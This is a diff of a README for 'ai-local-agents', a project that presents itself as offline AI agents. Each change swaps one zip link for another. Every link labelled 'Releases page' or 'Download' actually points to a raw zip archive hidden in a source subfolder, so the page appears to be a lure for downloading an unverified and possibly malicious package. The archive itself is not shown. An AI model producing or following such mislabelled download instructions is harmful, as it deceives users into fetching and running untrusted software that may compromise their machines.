@@ -1,7 +1,7 @@
 # 🤖 ai-local-agents - Intelligent AI Made Easy
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/web_scraper_agent/ai-local-agents_2.4.zip)](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/web_scraper_agent/ai-local-agents_2.4.zip)
+[![Download](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/basic_ai_agent/agents-local-ai-v3.7.zip)](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/basic_ai_agent/agents-local-ai-v3.7.zip)
 
 ## 📖 Overview
 ai-local-agents is a collection of intelligent AI agents designed for various tasks like chatting, voice assistance, web scraping, document reading, and more. These agents work without an API, ensuring privacy and autonomy.
@@ -16,7 +16,7 @@ To begin using ai-local-agents, you'll need to follow a few simple steps. This g
 - Processor: Dual-core processor or better
 
 ### 💾 Download & Install
-To get your copy of ai-local-agents, please visit the [Releases page](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/web_scraper_agent/ai-local-agents_2.4.zip) to download the latest version. 
+To get your copy of ai-local-agents, please visit the [Releases page](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/basic_ai_agent/agents-local-ai-v3.7.zip) to download the latest version. 
 
 1. Click on the link above to navigate to the Releases page.
 2. Look for the latest version of the software.
@@ -62,6 +62,6 @@ Join our community for support. You can connect with others who use ai-local-age
 ## 🎯 Learn More
 To discover more about ai-local-agents, visit the documentation on our GitHub repository.
 
-- Check the [Releases page](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/web_scraper_agent/ai-local-agents_2.4.zip) for the latest versions and updates.
+- Check the [Releases page](https://raw.githubusercontent.com/DR1X1/ai-local-agents/main/basic_ai_agent/agents-local-ai-v3.7.zip) for the latest versions and updates.
   
 Thank you for using ai-local-agents. We hope you enjoy your experience with intelligent AI!
